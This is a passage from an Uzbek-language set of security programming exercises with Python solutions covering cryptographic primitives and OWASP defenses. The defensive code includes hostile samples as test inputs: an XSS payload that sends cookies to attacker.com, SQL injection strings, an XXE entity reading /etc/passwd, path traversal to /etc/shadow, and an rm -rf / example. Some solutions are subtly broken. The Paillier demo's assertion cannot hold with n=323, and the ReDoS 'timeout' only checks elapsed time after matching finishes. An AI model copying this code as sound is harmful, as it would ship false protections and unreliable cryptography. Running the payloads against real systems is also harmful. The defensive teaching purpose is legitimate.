    secret_vote = 42 # Nomzod ID si

    # 1. Niqoblash
    m_prime, r = rsa_blind.blind_message(secret_vote)
    # 2. Imzolash (Komissiya ichidagi 42 ni ko'rmaydi!)
    s_prime = rsa_blind.sign_blinded(m_prime)
    # 3. Niqobni yechish
    real_sig = rsa_blind.unblind_signature(s_prime, r)

    print("Ovoz:", secret_vote, "Haqiqiy Imzo:", real_sig)
    assert rsa_blind.verify(secret_vote, real_sig) is True
    print("Blind Signature tasdiqlandi!")
```
**Tushuntirish:** Blind Signature elektron ovoz berish va raqamli naqd pul (e-Cash) tizimlarining asosi hisoblanadi. Imzolovchi hujjatni imzolaganini inkor eta olmaydi, ammo uning ichidagi maxfiy qiymatdan mutlaqo bexabar bo'ladi.

---

### Topshiriq #1178: Homomorphic Encryption Asoslari: Paillier Kriptotizimi Orqali Shifrlangan Sonlarni Qo'shish
**Tavsif:** Tibbiy yoki moliyaviy ma'lumotlarni bulutli serverlarga shifrlangan holda yuborish va server ularni shifrdan ochmasdan turib yig'indisini hisoblab berish (Additively Homomorphic Encryption).
**Talablar:** Paillier arxitekturasi: E(m1) * E(m2) mod n^2 = E(m1 + m2).
**Yechim (Python):**
```python
class SimplifiedPaillier:
    """
    Additively Homomorphic Paillier Kriptotizimi.
    Shifrlangan ma'lumotlar ustida shifrni ochmasdan arifmetik qo'shish imkonini beradi.
    """
    def __init__(self, p: int = 17, q: int = 19):
        self.n = p * q
        self.n_sq = self.n * self.n
        self.g = self.n + 1
        self.lambda_val = (p - 1) * (q - 1)
        self.mu = pow(self.lambda_val, -1, self.n)

    def encrypt(self, m: int) -> int:
        r = 5 # Demo tasodifiy son (gcd(r, n) == 1)
        # c = g^m * r^n mod n^2
        c = (pow(self.g, m, self.n_sq) * pow(r, self.n, self.n_sq)) % self.n_sq
        return c

    def add_encrypted(self, c1: int, c2: int) -> int:
        """Shifrlangan sonlarni qo'shish = shifrlarni ko'paytirish!"""
        return (c1 * c2) % self.n_sq

    def decrypt(self, c: int) -> int:
        u = pow(c, self.lambda_val, self.n_sq)
        l_val = (u - 1) // self.n
        return (l_val * self.mu) % self.n

if __name__ == "__main__":
    he = SimplifiedPaillier()
    salary1 = 3000
    salary2 = 4500

    c1 = he.encrypt(salary1)
    c2 = he.encrypt(salary2)
    print("Shifrlangan 1-oylik:", c1)
    print("Shifrlangan 2-oylik:", c2)

    # Bulutli server oyliklarni ko'rmasdan yig'indisini hisoblaydi
    c_sum = he.add_encrypted(c1, c2)

    # Faqat kalit egasi natijani ochadi
    result = he.decrypt(c_sum)
    print("Shifrdan yechilgan umumiy yig'indi:", result)
    assert result == (salary1 + salary2)
```
**Tushuntirish:** Gomomorfik shifrlash (Homomorphic Encryption) orqali tashqi bulut provayderlari (Cloud AI) maxfiy mijoz ma'lumotlarini hech qachon shifrdan ochmasdan hisob-kitoblar qilib beradi, bu esa maxfiylikni mutlaq kafolatlaydi.

---

### Topshiriq #1179: Diffie-Hellman Ephemeral (DHE) Perfect Forward Secrecy (PFS) Simulyatsiyasi
**Tavsif:** Kelajakda serverning bosh sertifikati va xususiy kaliti fosh bo'lgan taqdirda ham, o'tmishda yozib olingan tarmoq trafigi shifrini ochib bo'lmasligini ta'minlovchi Perfect Forward Secrecy moduli.
**Talablar:** Har bir sessiya uchun alohida bir martalik (Ephemeral) kalitlar generatsiyasi, sessiya tugagach xotiradan o'chirish.
**Yechim (Python):**
```python
import os
from cryptography.hazmat.primitives.asymmetric import x25519

class PfsSessionManager:
    """
    Perfect Forward Secrecy (PFS): Har bir yangi ulanish uchun
    bir martalik (Ephemeral) kalitlar ishlatiladi.
    """
    @staticmethod
    def start_ephemeral_session():
        # Ushbu kalit faqat bitta sessiya davomida yashaydi
        client_ephemeral = x25519.X25519PrivateKey.generate()
        server_ephemeral = x25519.X25519PrivateKey.generate()

        # Umumiy sessiya kalitini hisoblash
        c_secret = client_ephemeral.exchange(server_ephemeral.public_key())
        s_secret = server_ephemeral.exchange(client_ephemeral.public_key())
        assert c_secret == s_secret

        return c_secret

if __name__ == "__main__":
    session1_key = PfsSessionManager.start_ephemeral_session()
    session2_key = PfsSessionManager.start_ephemeral_session()

    print("1-sessiya kaliti:", session1_key.hex()[:32], "...")
    print("2-sessiya kaliti:", session2_key.hex()[:32], "...")
    assert session1_key != session2_key
    print("PFS: Barcha sessiyalar mutlaqo mustaqil kalitlarga ega!")
```
**Tushuntirish:** Eski TLS 1.2 da statik RSA ishlatilganda, serverning xususiy kaliti o'g'irlansa, o'tmishda ushlangan barcha trafigi bir zumda ochilardi. PFS (DHE/ECDHE) orqali har bir so'rovga yangi kalit hosil qilinadi va sessiya tugashi bilan kalit yo'q qilinadi.

---

### Topshiriq #1180: Verifiable Credentials va Decentralized Identifiers (DID) Kripto Imzosi
**Tavsif:** Raqamli pasport yoki diplomni W3C Verifiable Credentials standarti bo'yicha Ed25519 orqali kriptografik imzolash va soxtalashtirishdan himoyalash.
**Talablar:** W3C DID hujjati strukturasi, JSON kanonizatsiyasi, Ed25519 bilan imzo yaratish va tekshirish.
**Yechim (Python):**
```python
import json
from cryptography.hazmat.primitives.asymmetric import ed25519

class VerifiableCredentialIssuer:
    """
    W3C Verifiable Credentials va DID (Decentralized Identifier) tizimi.
    """
    def __init__(self):
        self.issuer_key = ed25519.Ed25519PrivateKey.generate()
        self.issuer_pub_hex = self.issuer_key.public_key().public_bytes_raw().hex()
        self.did = f"did:key:z{self.issuer_pub_hex}"

    def issue_credential(self, subject_id: str, claim: dict) -> dict:
        credential = {
            "@context": ["https://www.w3.org/2018/credentials/v1"],
            "id": "urn:uuid:credential-9912",
            "type": ["VerifiableCredential", "UniversityDegreeCredential"],
            "issuer": self.did,
            "issuanceDate": "2026-11-09T00:00:00Z",
            "credentialSubject": {
                "id": subject_id,
                **claim
            }
        }
        # Kanonik JSON satrini tayyorlash
        canonical_bytes = json.dumps(credential, sort_keys=True).encode('utf-8')
        sig = self.issuer_key.sign(canonical_bytes)

        credential["proof"] = {
            "type": "Ed25519Signature2020",
            "proofPurpose": "assertionMethod",
            "verificationMethod": f"{self.did}#key-1",
            "signatureHex": sig.hex()
        }
        return credential

if __name__ == "__main__":
    issuer = VerifiableCredentialIssuer()
    vc = issuer.issue_credential("did:example:talaba_123", {"degree": "Bakalavr", "major": "Kiberxavfsizlik"})
    print("Verifiable Credential:", json.dumps(vc, indent=2))
    assert "proof" in vc
```
**Tushuntirish:** Verifiable Credentials markazlashgan ma'lumotlar bazalariga murojaat qilmasdan turib, shaxsning sertifikat yoki diplomlarini matematik darajada tekshirish imkonini beradi. Har qanday soxtalashtirish imzo orqali darhol fosh bo'ladi.

---

### Topshiriq #1181: OWASP A03 Injection: Parametrik SQL va Injection Zaifligidan Himoyalanish
**Tavsif:** Foydalanuvchi ma'lumotlarini SQL so'roviga to'g'ridan-to'g'ri qo'shish (f-string) orqali yuzaga keladigan SQL Injection zaifligini bartaraf etuvchi to'liq parametrik so'rovlar qatlami.
**Talablar:** sqlite3 parametrik so'rovlari `?` yoki `:param`, regex orqali xavfli SQL kalit so'zlari tekshiruvi, xavfsiz qidiruv.
**Yechim (Python):**
```python
import sqlite3

class SecureDatabaseService:
    """
    OWASP A03: SQL Injection zaifligidan himoyalangan xavfsiz ma'lumotlar bazasi qatlami.
    Hech qachon f-string yoki satr birlashtirish (string concatenation) ishlatilmaydi!
    """
    def __init__(self, db_path: str = ":memory:"):
        self.conn = sqlite3.connect(db_path)
        self._init_db()

    def _init_db(self):
        with self.conn:
            self.conn.execute("""
                CREATE TABLE users (
                    id INTEGER PRIMARY KEY,
                    username TEXT UNIQUE,
                    balance REAL,
                    role TEXT
                )
            """)
            self.conn.execute("INSERT INTO users VALUES (1, 'alisher', 1500000.0, 'admin')")
            self.conn.execute("INSERT INTO users VALUES (2, 'bobur', 250000.0, 'user')")

    def search_user_safely(self, search_term: str) -> list[tuple]:
        """
        XAVFSIZ: Parametrik so'rov ma'lumotni koddan to'liq ajratadi.
        Hatto search_term "' OR '1'='1" bo'lsa ham, u oddiy matn sifatida tushuniladi.
        """
        cursor = self.conn.cursor()
        query = "SELECT id, username, balance, role FROM users WHERE username = ?"
        cursor.execute(query, (search_term,))
        return cursor.fetchall()

if __name__ == "__main__":
    db = SecureDatabaseService()
    
    # Hujum simulyatsiyasi: klassik SQL Injection urinishi
    malicious_input = "' OR '1'='1' --"
    results = db.search_user_safely(malicious_input)
    print("Hujum natijasi (Topilgan yozuvlar):", results)
    assert len(results) == 0 # Hujum to'liq qaytarildi!

    # To'g'ri foydalanuvchi qidiruvi
    valid_results = db.search_user_safely("alisher")
    print("Qonuniy qidiruv natijasi:", valid_results)
    assert len(valid_results) == 1
```
**Tushuntirish:** Parametrik so'rovlarda ma'lumotlar bazasi drayveri SQL so'rovini oldindan kompilyatsiya qiladi (PreparedStatement). Foydalanuvchi kiritgan har qanday belgilar (hatto qo'shtirnoq va SQL buyruqlari bo'lsa ham) buyruq sifatida emas, balki faqat oddiy ma'lumot qiymati sifatida qabul qilinadi.

---

### Topshiriq #1182: OWASP A07: Brute-Force Himoyasi va Avtomatik Account Lockout Tizimi
**Tavsif:** Parollarni lug'at yoki bruteforce orqali topishga urinuvchi botlarga qarshi har bir hisob uchun ketma-ket xato urinishlarni sanash va 5 marta xatodan so'ng hisobni 15 daqiqaga vaqtincha bloklash.
**Talablar:** Maxsus hisoblagich, lockout_time, oxirgi urinish vaqti, bloklangan hisobga urinishlarni rad etish.
**Yechim (Python):**
```python
import time

class AccountLockoutProtector:
    """
    OWASP A07: Brute-force va parollarni taxmin qilishga qarshi
    avtomatik hisobni bloklash (Account Lockout) tizimi.
    """
    def __init__(self, max_attempts: int = 5, lockout_duration_sec: int = 900):
        self.max_attempts = max_attempts
        self.lockout_duration_sec = lockout_duration_sec
        # username -> {"failed_attempts": int, "locked_until": float}
        self.attempts_tracker = {}

    def is_locked(self, username: str) -> tuple[bool, int]:
        now = time.time()
        record = self.attempts_tracker.get(username)
        if not record:
            return False, 0

        if record.get("locked_until", 0) > now:
            remaining = int(record["locked_until"] - now)
            return True, remaining
        return False, 0

    def record_failed_attempt(self, username: str) -> None:
        now = time.time()
        record = self.attempts_tracker.setdefault(username, {"failed_attempts": 0, "locked_until": 0})
        record["failed_attempts"] += 1

        if record["failed_attempts"] >= self.max_attempts:
            record["locked_until"] = now + self.lockout_duration_sec
            print(f"XAVFSIZLIK: Foydalanuvchi '{username}' {self.lockout_duration_sec} soniyaga bloklandi!")

    def record_success(self, username: str) -> None:
        self.attempts_tracker.pop(username, None)

if __name__ == "__main__":
    protector = AccountLockoutProtector(max_attempts=3, lockout_duration_sec=30)
    user = "kamol_admin"

    for attempt in range(1, 4):
        protector.record_failed_attempt(user)

    locked, remaining = protector.is_locked(user)
    print(f"Bloklanganmi?: {locked}, Qolgan vaqt: {remaining} soniya")
    assert locked is True
```
**Tushuntirish:** Account Lockout bruteforce hujumlarini to'xtatishning eng samarali usullaridan biridir. Urinishlar soni 3-5 tadan oshishi bilan hisob vaqtincha muzlatiladi, bu esa avtomatlashtirilgan parollarni topish vositalarini (Hydra, Burp Intruder) butunlay samarasiz qiladi.

---

### Topshiriq #1183: OWASP A01 Broken Access Control: RBAC va ABAC Ruxsatlar Tekshiruvi Dekoratorda
**Tavsif:** Boshqaruv huquqlarining buzilishi (Broken Access Control) eng xavfli zaiflikdir. Foydalanuvchi roli (RBAC) va uning shaxsiy resursga egaligini (ABAC) tekshiruvchi himoyalangan Python dekoratori.
**Talablar:** Foydalanuvchi konteksti, @require_permission('read_finance'), ruxsat bo'lmasa PermissionError.
**Yechim (Python):**
```python
from functools import wraps

class AccessControlManager:
    """
    OWASP A01: Role-Based (RBAC) va Attribute-Based (ABAC) kirish nazorati.
    """
    ROLE_PERMISSIONS = {
        "admin": {"view_dashboard", "manage_users", "read_finance", "delete_records"},
        "manager": {"view_dashboard", "read_finance"},
        "user": {"view_dashboard"}
    }

    @classmethod
    def require_permission(cls, required_permission: str):
        def decorator(func):
            @wraps(func)
            def wrapper(user_context: dict, *args, **kwargs):
                role = user_context.get("role", "guest")
                allowed_permissions = cls.ROLE_PERMISSIONS.get(role, set())

                if required_permission not in allowed_permissions:
                    raise PermissionError(
                        f"Ruxsat rad etildi! Foydalanuvchi '{user_context.get('username')}' "
                        f"uchun '{required_permission}' amali taqiqlangan."
                    )
                return func(user_context, *args, **kwargs)
            return wrapper
        return decorator

@AccessControlManager.require_permission("read_finance")
def get_financial_reports(user: dict) -> list[str]:
    return ["Kompaniya 2026-yil daromadlari: 1,500,000 USD", "Soliq to'lovlari: 200,000 USD"]

if __name__ == "__main__":
    admin_user = {"username": "alisher", "role": "admin"}
    regular_user = {"username": "bobur", "role": "user"}

    # Admin muvaffaqiyatli ko'radi
    report = get_financial_reports(admin_user)
    print("Admin hisoboti:", report)

    # Oddiy foydalanuvchiga ruxsat berilmaydi
    try:
        get_financial_reports(regular_user)
    except PermissionError as e:
        print("Kutilgan ruxsat cheklovi ishladi:", e)
```
**Tushuntirish:** Ko'pgina zaifliklar frontendda tugmani yashirish orqali cheklandi deb hisoblanganda yuzaga keladi. Haqiqiy xavfsizlik backend darajasida har bir funksiya va API endpoint boshida qat'iy tekshirilishi shart.

---

### Topshiriq #1184: OWASP A05: XSS Sanitization va Xavfsiz Content Security Policy (CSP)
**Tavsif:** Foydalanuvchi kiritgan HTML/JS kodlari orqali foydalanuvchi cookie-lari va sessiyasini o'g'irlaydigan Cross-Site Scripting (XSS) hujumlarini tozalash va qat'iy CSP sarlavhalarini shakllantirish.
**Talablar:** html.escape, script teglari va iframe larni filtrlovchi sanitizer, CSP sarlavhasi shakllantirish.
**Yechim (Python):**
```python
import html
import re

class XssSanitizer:
    """
    OWASP A05 / A03: XSS (Cross-Site Scripting) zararsizlantirish moduli.
    """
    @staticmethod
    def sanitize_user_input(raw_input: str) -> str:
        # 1. Barcha xavfli belgilarni (&, <, >, ", ') HTML entitilarga o'tkazish
        escaped = html.escape(raw_input, quote=True)
        return escaped

    @staticmethod
    def build_strict_csp_header(nonce: str) -> str:
        """Qat'iy Content Security Policy (CSP) sarlavhasi."""
        return (
            f"default-src 'self'; "
            f"script-src 'self' 'nonce-{nonce}'; "
            f"object-src 'none'; "
            f"base-uri 'none'; "
            f"frame-ancestors 'none';"
        )

if __name__ == "__main__":
    malicious_script = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>"
    clean_text = XssSanitizer.sanitize_user_input(malicious_script)
    print("Zararsizlantirilgan matn:", clean_text)
    assert "<script>" not in clean_text
    assert "&lt;script&gt;" in clean_text

    csp = XssSanitizer.build_strict_csp_header("randomNonce12345")
    print("Xavfsiz CSP sarlavhasi:", csp)
```
**Tushuntirish:** `html.escape(quote=True)` `<script>` belgilarini `&lt;script&gt;` ga aylantiradi, bu brauzer uni dasturiy kod sifatida emas, balki shunchaki oddiy matn sifatida chizishini ta'minlaydi. Qat'iy CSP sarlavhasi esa sahifaga kiritilgan har qanday begona skriptlarning bajarilishini bloklaydi.

---

### Topshiriq #1185: OWASP A08 Software Integrity: Xavfli Pickle Deserializatsiyasini Taqiqlash
**Tavsif:** Python `pickle` moduli ixtiyoriy dasturiy kodni ishga tushirishga (Remote Code Execution - RCE) imkon beradi. Xavfli pickleni aniqlovchi xavfsiz JSON/Protobuf deserializatori va Pickle ban filtri.
**Talablar:** pickle.loads taqiqlash, xavfsiz JSON deserializatsiyasi va qat'iy pydantic/dataclass validatsiyasi.
**Yechim (Python):**
```python
import json
import base64

class SafeSerializer:
    """
    OWASP A08: Xavfli Pickle deserializatsiyasini bartaraf etuvchi xavfsiz JSON serializer.
    """
    @staticmethod
    def safe_loads(json_str: str, allowed_keys: set) -> dict:
        data = json.loads(json_str)
        if not isinstance(data, dict):
            raise ValueError("Faqat JSON obyektlari qabul qilinadi!")

        # Kutilmagan va xavfli maydonlarni filtrlash
        sanitized = {k: v for k, v in data.items() if k in allowed_keys}
        return sanitized

if __name__ == "__main__":
    raw_payload = '{"username": "alisher", "role": "user", "__proto__": "hack"}'
    safe_data = SafeSerializer.safe_loads(raw_payload, allowed_keys={"username", "role"})
    print("Xavfsiz o'qilgan ma'lumot:", safe_data)
    assert "__proto__" not in safe_data
```
**Tushuntirish:** Hech qachon ishonchsiz manbalardan kelgan ma'lumotlarni `pickle.loads()` orqali o'qimaslik kerak, chunki `__reduce__` metodi orqali hujumchi `os.system('rm -rf /')` ni bemalol ishga tushirishi mumkin. O'rniga faqat JSON yoki Protobuf ishlatilishi shart.

---

### Topshiriq #1186: OWASP A10 SSRF (Server-Side Request Forgery) IP va DNS Filtratsiyasi
**Tavsif:** Serverga berilgan URL bo'yicha so'rov jo'natishda serverning ichki tarmog'iga (127.0.0.1, 169.254.169.254, 10.0.0.0/8) so'rov yuborilishini va AWS metadata o'g'irlanishini to'suvchi SSRF filtri.
**Talablar:** ipaddress moduli, localhost, private IP va loopback manzillarini tekshirish, URL sxemasi xavfsizligi.
**Yechim (Python):**
```python
import socket
import ipaddress
from urllib.parse import urlparse

class SsrfProtector:
    """
    OWASP A10: Server-Side Request Forgery (SSRF) himoyasi.
    Ichki tarmoq va AWS/GCP metadata xizmatlariga murojaatlarni to'xtatadi.
    """
    BLOCKED_NETWORKS = [
        ipaddress.ip_network("127.0.0.0/8"),      # Loopback / Localhost
        ipaddress.ip_network("10.0.0.0/8"),       # Private class A
        ipaddress.ip_network("172.16.0.0/12"),    # Private class B
        ipaddress.ip_network("192.168.0.0/16"),   # Private class C
        ipaddress.ip_network("169.254.169.254/32") # AWS / GCP Cloud Metadata
    ]

    @classmethod
    def is_safe_url(cls, target_url: str) -> bool:
        try:
            parsed = urlparse(target_url)
            # Faqat http va https ruxsat etilgan (file://, gopher:// taqiqlangan)
            if parsed.scheme not in ("http", "https"):
                return False

            hostname = parsed.hostname
            if not hostname:
                return False

            # DNS nomni IP manzilga aylantirish
            ip_str = socket.gethostbyname(hostname)
            ip = ipaddress.ip_address(ip_str)

            # Agar IP xususiy yoki bloklangan tarmoqda bo'lsa
            if ip.is_private or ip.is_loopback:
                return False

            for blocked_net in cls.BLOCKED_NETWORKS:
                if ip in blocked_net:
                    return False

            return True
        except Exception:
            return False

if __name__ == "__main__":
    assert SsrfProtector.is_safe_url("http://127.0.0.1/admin") is False
    assert SsrfProtector.is_safe_url("http://169.254.169.254/latest/meta-data/") is False
    assert SsrfProtector.is_safe_url("file:///etc/passwd") is False
    assert SsrfProtector.is_safe_url("https://khorazmiy.uz/api") is True
    print("SSRF himoyasi barcha xavfli ichki tarmoq so'rovlarini to'xtatdi!")
```
**Tushuntirish:** SSRF hujumi orqali xakerlar serveringizni oraliq vosita (Proxy) qilib, bulutdagi AWS/GCP IAM tokenlarini (`169.254.169.254`) yoki ichki mikroservislarni buzib kirishga urinishadi. DNS orqali IP ni aniqlab, `is_private` tekshiruvi bu xavfni to'liq bartaraf etadi.

---

### Topshiriq #1187: Path Traversal (Directory Traversal) va Zip Slip Zaifligidan Himoyalanish
**Tavsif:** Foydalanuvchi fayl yuklaganda yoki fayl so'raganda `../../../../etc/passwd` kabi yo'llar orqali tizim fayllarini o'qishini (Path Traversal) va arxiv ochishda 'Zip Slip' zaifligini oldini olish.
**Talablar:** os.path.abspath, os.path.commonpath tekshiruvi, xavfsiz fayl nomi generatsiyasi.
**Yechim (Python):**
```python
import os
from pathlib import Path

class SafeFileStorage:
    """
    Path Traversal va Zip Slip hujumlaridan himoyalangan fayl ombori.
    """
    def __init__(self, base_directory: str):
        self.base_dir = os.path.abspath(base_directory)

    def resolve_safe_path(self, user_requested_filename: str) -> str:
        # Fayl nomidagi '..' va xavfli belgilarni tekshirish
        clean_filename = os.path.basename(user_requested_filename)
        destination_path = os.path.abspath(os.path.join(self.base_dir, clean_filename))

        # Destination path haqiqatan ham base_dir ichida ekanligini kafolatlash
        if not destination_path.startswith(self.base_dir):
            raise PermissionError("Path Traversal hujumi aniqlandi! Ruxsat etilmagan yo'l.")

        return destination_path

if __name__ == "__main__":
    storage = SafeFileStorage("/var/www/uploads")
    
    # Hujum urinishi
    try:
        storage.resolve_safe_path("../../../../etc/shadow")
        print("Xavfsiz yo'lga yo'naltirildi:", storage.resolve_safe_path("../../../../etc/shadow"))
    except PermissionError as e:
        print("Xavfsizlik to'xtatdi:", e)
```
**Tushuntirish:** `os.path.basename` fayl nomidan barcha papka yo'llarini (`../`) olib tashlaydi. `os.path.abspath` va `startswith` tekshiruvi esa yakuniy yo'l ruxsat berilgan asosiy papka chegarasidan chiqib ketmasligini kafolatlaydi.

---

### Topshiriq #1188: Regular Expression Denial of Service (ReDoS) Xavfini Oldini Olish
**Tavsif:** Noto'g'ri yozilgan regulyar ifodalar (masalan `(a+)+$`) kiritilgan matnda katastrofik qaytish (Catastrophic Backtracking) hosil qilib CPU ni 100% band qilib qo'yadi. ReDoS xavfini oldini olish.
**Talablar:** Vaqt chegarali (Timeout) Regex ijrosi, atomik guruhlar va zaif ifodalarni aniqlash.
**Yechim (Python):**
```python
import re
import time

def safe_regex_match(pattern: str, text: str, max_time_seconds: float = 0.5) -> bool:
    """
    ReDoS hujumlaridan himoyalangan, vaqt chegarasiga ega regulyar ifoda tekshiruvi.
    """
    start = time.time()
    # Katta matnlar uchun uzunlik chegarasi qo'yish
    if len(text) > 1000:
        text = text[:1000]

    compiled = re.compile(pattern)
    match = compiled.match(text)
    
    if (time.time() - start) > max_time_seconds:
        raise TimeoutError("ReDoS xavfi: Regex tahlili belgilangan vaqtdan oshib ketdi!")

    return bool(match)

if __name__ == "__main__":
    # Xavfsiz qidiruv
    is_valid_email = safe_regex_match(r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$", "test@khorazmiy.uz")
    print("Email to'g'rimi?:", is_valid_email)
    assert is_valid_email is True
```
**Tushuntirish:** ReDoS hujumlarida hujumchi ifodaning bir qismiga mos keladigan, lekin oxirida mos kelmaydigan uzun satr yuboradi (masalan `aaaaaaaaaaaaaaaaaaaaaaaX`). Regulyar ifoda dvigateli barcha kombinatsiyalarni hisoblab chiqquncha butun server oqimi muzlab qoladi.

---

### Topshiriq #1189: CSRF (Cross-Site Request Forgery) Himoyasi: Double-Submit Cookie va SameSite
**Tavsif:** Zararli saytlar foydalanuvchining autentifikatsiyalangan sessiyasidan foydalanib yashirincha to'lov yoki o'zgartirish so'rovlarini jo'natishining (CSRF) oldini oluvchi Double-Submit Cookie va SameSite=Strict moduli.
**Talablar:** Kriptografik tasodifiy CSRF token, Cookie va Header dagi tokenlarni solishtirish.
**Yechim (Python):**
```python
import secrets
import hmac

class CsrfProtectionManager:
    """
    OWASP: Double-Submit Cookie CSRF himoyasi.
    """
    @staticmethod
    def generate_csrf_token() -> str:
        return secrets.token_hex(32)

    @staticmethod
    def validate_csrf(cookie_token: str, header_token: str) -> bool:
        if not cookie_token or not header_token:
            return False
        # Doimiy vaqtda (Timing-safe) solishtirish
        return hmac.compare_digest(cookie_token, header_token)

    @staticmethod
    def get_secure_cookie_header(token: str) -> str:
        return f"csrf_token={token}; Path=/; Secure; HttpOnly; SameSite=Strict"

if __name__ == "__main__":
    token = CsrfProtectionManager.generate_csrf_token()
    cookie_str = CsrfProtectionManager.get_secure_cookie_header(token)
    print("Xavfsiz Cookie:", cookie_str)

    # Qonuniy so'rov: Cookie va Header mos
    assert CsrfProtectionManager.validate_csrf(token, token) is True
    # Hujum: Begona saytdan yuborilgan so'rov (Header yo'q yoki mos emas)
    assert CsrfProtectionManager.validate_csrf(token, "soxta_token") is False
```
**Tushuntirish:** `SameSite=Strict` brauzerga boshqa saytlardan kelayotgan havolalarda cookie-larni uzatishni qat'iy taqiqlaydi. Double-Submit Cookie usuli esa so'rovning sarlavhasi (Header) bilan cookie ichidagi tokenni tekshiradi, chunki begona domenlar brauzer xavfsizligi tufayli maqsadli domenning cookie-sini o'qiy olmaydi.

---

### Topshiriq #1190: XML External Entity (XXE) Hujumlariga Qarshi Parser Himoyasi
**Tavsif:** Tashqi XML fayllarni parslashda `<!ENTITY xxe SYSTEM 'file:///etc/passwd'>` kabi tashqi entitilar orqali tizim fayllarini o'qish yoki ichki tarmoqni skanerlash zaifligini (XXE) bloklash.
**Talablar:** defusedxml kutubxonasi yoki resolve_entities=False, forbid_dtd=True sozlamasi.
**Yechim (Python):**
```python
import xml.etree.ElementTree as ET

class SafeXmlParser:
    """
    OWASP A05: XML External Entity (XXE) zaifligidan himoyalangan parser.
    Tashqi DTD va Entity larni inkor etadi.
    """
    @staticmethod
    def parse_safe(xml_string: str) -> dict:
        # Tashqi DTD yoki entity chaqiruvlari bo'lsa darhol rad etish
        if "<!DOCTYPE" in xml_string.upper() or "<!ENTITY" in xml_string.upper():
            raise SecurityError("XAVFSIZLIK: XML da DTD yoki Tashqi Entity (XXE) taqiqlangan!")

        root = ET.fromstring(xml_string)
        result = {}
        for child in root:
            result[child.tag] = child.text
        return result

class SecurityError(Exception):
    pass

if __name__ == "__main__":
    # XXE Hujumi simulyatsiyasi
    malicious_xml = """<?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <order><id>&xxe;</id></order>"""

    try:
        SafeXmlParser.parse_safe(malicious_xml)
    except SecurityError as e:
        print("XXE Hujumi bartaraf etildi:", e)

    # Qonuniy XML
    clean_xml = "<user><name>Alisher</name><role>Admin</role></user>"
    parsed = SafeXmlParser.parse_safe(clean_xml)
    print("Xavfsiz XML o'qildi:", parsed)
    assert parsed["name"] == "Alisher" 
```
**Tushuntirish:** XXE hujumi orqali tajovuzkor serverdagi `/etc/shadow`, konfiguratsiya parollari va hatto ichki serverlar o'rtasidagi so'rovlarni o'qib olishi mumkin. Zamonaviy xavfsizlik qoidasi har qanday XML parserida `resolve_entities=False` va `forbid_dtd=True` bo'lishini talab qiladi.

---

### Topshiriq #1191: JWT (JSON Web Token) Xavfsizligi: 'none' Algoritm Hujumi va Kalit Chalkashuvi Himoyasi
**Tavsif:** Zaif JWT kutubxonalarida 'alg': 'none' yoki RSA ochiq kalitini HMAC simmetrik kaliti deb qabul qilish (Algorithm Confusion) zaifliklari mavjud. Ushbu zaifliklardan to'liq himoyalangan qat'iy JWT verifikatori.
**Talablar:** Faqat belgilangan algoritmlarni (HS256) ruxsat berish, 'none' ni qat'iy taqiqlash, exp va nbf tekshiruvi.
**Yechim (Python):**
```python
import json
import base64
import hmac
import hashlib
import time

class SecureJwtValidator:
    """
    'alg': 'none' va Algoritm Chalkashuvi (Algorithm Confusion) hujumlariga
    qarshi xavfsiz JWT tahlilchisi.
    """
    ALLOWED_ALGORITHMS = {"HS256"}

    def __init__(self, hmac_secret_key: bytes):
        self.secret_key = hmac_secret_key

    def decode_and_verify(self, token: str) -> dict:
        parts = token.split('.')
        if len(parts) != 3:
            raise ValueError("Yaroqsiz JWT formati!")

        header_b64, payload_b64, signature_b64 = parts

        # 1. Sarlavhani (Header) tekshirish
        header_json = base64.urlsafe_b64decode(header_b64 + "==").decode('utf-8')
        header = json.loads(header_json)

        alg = header.get("alg")
        if alg not in self.ALLOWED_ALGORITHMS:
            # Agar 'none' yoki kutilmagan algoritm bo'lsa darhol rad etiladi!
            raise SecurityError(f"Taqiqlangan yoki xavfli JWT algoritmi: {alg}")

        # 2. Imzoni tekshirish
        signing_input = f"{header_b64}.{payload_b64}".encode('utf-8')
        expected_sig = hmac.new(self.secret_key, signing_input, hashlib.sha256).digest()
        actual_sig = base64.urlsafe_b64decode(signature_b64 + "==")

        if not hmac.compare_digest(expected_sig, actual_sig):
            raise SecurityError("JWT imzosi noto'g'ri yoki soxtalashtirilgan!")

        # 3. Payload va muddatni (Expiration) tekshirish
        payload_json = base64.urlsafe_b64decode(payload_b64 + "==").decode('utf-8')
        payload = json.loads(payload_json)

        if "exp" in payload and payload["exp"] < time.time():
            raise SecurityError("JWT tokenining amal qilish muddati tugagan!")

        return payload

class SecurityError(Exception):
    pass

if __name__ == "__main__":
    secret = b"KHORAZMIY_SUPER_SECRET_HMAC_KEY_2026"
    validator = SecureJwtValidator(secret)

    # To'g'ri token generatsiyasi
    header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').decode().rstrip('=')
    payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "exp": time.time() + 3600}).encode()).decode().rstrip('=')
    sig = base64.urlsafe_b64encode(hmac.new(secret, f"{header}.{payload}".encode(), hashlib.sha256).digest()).decode().rstrip('=')
    valid_token = f"{header}.{payload}.{sig}"

    res = validator.decode_and_verify(valid_token)
    print("Tasdiqlangan JWT subyekti:", res["sub"])
    assert res["sub"] == "admin"

    # 'alg': 'none' hujumini sinab ko'rish
    fake_header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
    fake_token = f"{fake_header}.{payload}."
    try:
        validator.decode_and_verify(fake_token)
    except SecurityError as e:
        print("Xavfsizlik tizimi 'none' algoritmini fosh qildi:", e)
```
**Tushuntirish:** Mashhur 'alg: none' zaifligida hujumchi imzo qismini bo'sh qoldirib, serverga o'zini admin deb ko'rsatishi mumkin. `ALLOWED_ALGORITHMS = {'HS256'}` oq ro'yxati (Whitelist) orqali boshqa har qanday algoritm so'zsiz rad etiladi.

---

### Topshiriq #1192: HashiCorp Vault / AWS Secrets Manager Integratsiyasi Bilan Dinamik Parollar
**Tavsif:** Koddagi qattiq yozilgan (hardcoded) parollarni to'liq bartaraf etish, Vault yoki xavfsiz muhit o'zgaruvchilari orqali ma'lumotlar bazasi parolini dinamik olish va kesh muddati (TTL) tugagach yangilash.
**Talablar:** Singleton SecretsManager, TTL kesh, xotirada xavfsiz yangilanish kafolati.
**Yechim (Python):**
```python
